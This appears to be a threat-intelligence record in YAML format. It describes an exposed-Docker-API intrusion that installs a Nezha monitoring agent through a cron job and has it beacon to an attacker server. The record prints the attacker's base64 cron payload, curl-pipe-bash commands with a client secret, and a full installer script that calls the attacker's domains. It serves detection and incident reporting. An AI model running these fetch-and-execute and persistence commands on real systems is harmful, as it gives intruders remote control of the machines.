@@ -1,0 +1,96 @@
+title: Exposed Docker API Exploitation Leading to Cryptominer/Agent Installation via
+  Cron Persistence
+description: An attacker exploited an exposed Docker API to create a container that
+  decodes and executes a base64-encoded cron job payload, which downloads and installs
+  a Nezha monitoring agent configured to beacon to an attacker-controlled server.
+attribution: ''
+malware_families:
+- Nezha agent
+cves: []
+ttps:
+  processes:
+  - sh
+  - curl
+  - bash
+  command_lines:
+  - sh -c echo KiAqICogKiAqIHJvb3QgY3VybCBodHRwczovL2ZpbGUuZ3BINS5jb20vbGludXhfaW5zdGFsbC5zaCB8IGIhc2g=
+    | base64 -d > /root/ngk
+  - curl -fsSL https://file.gpu5[.]com/nezha_install.sh | NZ_SERVER=nezha.gpu5.com:443
+    NZ_TLS=true NZ_CLIENT_SECRET=71mWTDx1UZf8tXZ@pPdyak2FMisCj2Sm bash
+  powershell: []
+  scripts:
+  - '#!/bin/bash
+
+    if [ "$(id -u)" -ne 0 ]; then
+
+    exec sudo bash "$0" "$@"
+
+    fi
+
+    set -e
+
+    set -o pipefail
+
+    CONFIG_FILE="/opt/nezha/agent/config.yml"
+
+    TARGET_SERVER="nezha.gpu5.com:443"
+
+    if [ -f "$CONFIG_FILE" ]; then
+
+    if grep -q "$TARGET_SERVER" "$CONFIG_FILE"; then
+
+    exit 0
+
+    fi
+
+    fi
+
+    if [ -f /etc/debian_version ]; then
+
+    apt update -y
+
+    apt install -y unzip curl grep
+
+    elif [ -f /etc/redhat-release ]; then
+
+    yum update -y
+
+    yum install -y unzip curl grep
+
+    else
+
+    exit 1
+
+    fi
+
+    curl -fsSL https://file.gpu5.com/nezha_install.sh | NZ_SERVER=nezha.gpu5.com:443
+    NZ_TLS=true NZ_CLIENT_SECRET=71mWTDx1UZf8tXZ@pPdyak2FMisCj2Sm bash
+
+    echo "server: nezha.gpu5.com:443" >> /opt/nezha/agent/config.yml'
+  registry_keys: []
+  image_loads: []
+  network_connections:
+  - curl -> file.gpu5[.]com:443
+  - nezha-agent -> nezha.gpu5[.]com:443
+  file_activity:
+  - /root/ngk
+  - /opt/nezha/agent/config.yml
+  - /etc/cron.d
+  persistence:
+  - Cron job written to /etc/cron.d via Docker bind mount (/etc/cron.d:/root:rw) executing
+    curl to download and pipe shell script
+  - Nezha agent installed and configured to connect to nezha.gpu5[.]com:443 with TLS
+  process_relations:
+  - docker container (alpine:latest) -> sh
+iocs:
+  hashes: []
+  ip_addresses: []
+  domains:
+  - file.gpu5[.]com
+  - nezha.gpu5[.]com
+  urls:
+  - hxxps://file.gpu5[.]com/nezha_install.sh
+authors: []
+reference: https://www.darktrace.com/blog/always-on-always-defending-inside-the-ai-driven-soc
+date_of_publication: June 11, 2026
+file_creation_date: June 11, 2026
